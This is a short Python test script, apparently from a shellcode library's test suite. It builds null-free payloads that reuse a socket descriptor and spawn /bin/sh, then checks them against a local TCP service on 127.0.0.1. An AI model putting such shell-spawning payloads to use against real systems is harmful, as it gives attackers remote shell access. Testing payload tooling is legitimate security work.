#!/usr/bin/python

import shellcode
from testing import testing
import subprocess

def test():
	port = 1112
	sockfd = 20
	command = ["/bin/uname", "-i", "-o"]
	sc = shellcode.reusefd(sockfd)
	sc += shellcode.helloworld()
	testing.run_tcp_client_expect_recv_data(sc, "127.0.0.1", port, sockfd, "Hello World!\n")
	expect = subprocess.check_output(command)
	sc = shellcode.reusefd(sockfd)
	sc += shellcode.execve_sh()
	testing.verify_no_nulls(sc)
	testing.run_tcp_client_expect_recv_data_using_send_data(sc, "127.0.0.1", port, sockfd, expect, "uname -i -o\nexit\n")
	sc = shellcode.reusefd(sockfd)
	sc += shellcode.execve(["/bin/sh"])
	testing.verify_no_nulls(sc)
	testing.run_tcp_client_expect_recv_data_using_send_data(sc, "127.0.0.1", port, sockfd, expect, "uname -i -o\nexit\n")


if __name__ == "__main__":
	test()
